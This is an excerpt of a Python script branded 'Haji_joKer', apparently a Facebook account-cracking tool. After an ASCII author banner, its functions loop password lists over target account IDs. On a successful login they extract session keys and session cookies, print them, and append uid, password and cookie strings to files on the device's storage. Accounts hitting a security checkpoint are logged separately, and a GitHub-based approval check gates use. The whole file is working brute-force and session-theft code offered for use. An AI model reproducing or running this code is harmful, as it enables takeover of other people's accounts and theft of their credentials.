...
try:
        ...
        os.system('python Haji_joKer.py')  
#============Capture Protection============#
...
\033[1;92m    88  88    88 88,8P   88ooooo 88oobY' 
\033[1;92m   88  88    88 88`8b   88~~~~~ 88`8b   
\033[1;92mdb. 88  `8b  d8' 88 `88. 88.     88 `88. 
\033[1;92mY8888P   `Y88P'  YP   YD Y88888P 88   YD 
 \033[1;92m----------------------------------------
 \033[1;92m[+] 𝘼𝙐𝙏𝙃𝙊𝙍      :\033[1;92m  √  𝕛𝕠𝕜𝕖𝕣 𝕜𝕙𝕒𝕟
 \033[1;92m[+] 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋    : \033[1;92m √  𝕜𝕙𝕒𝕟 𝕛𝕠𝕜𝕖𝕣
 \033[1;92m[+] 𝗕𝗘𝗦𝗧 𝗙𝗥𝗜𝗘𝗡𝗗 : \033[92;1m √  𝕊ℍ𝔸ℍ𝕀 𝕁𝕆𝕂𝔼ℝ
 \033[1;92m[+] 𝗦𝗧𝗔𝗧𝗨𝗦      : \033[91;1m √   )(
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mHaji_joKer\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [Haji_joKer-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/Haji_joKer-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [Haji_joKer-CP] '+uid+' | '+pas+'\033[1;97m')
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;32m [\x1b[1;92mHaji_joKer\x1b[1;92m-\x1b[1;92mR-1\x1b[1;92m] %s|\033[1;32mOK|%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;31m [Haji_joKer-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/Haji_joKer-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/joker').text
    if id in httpCaht:
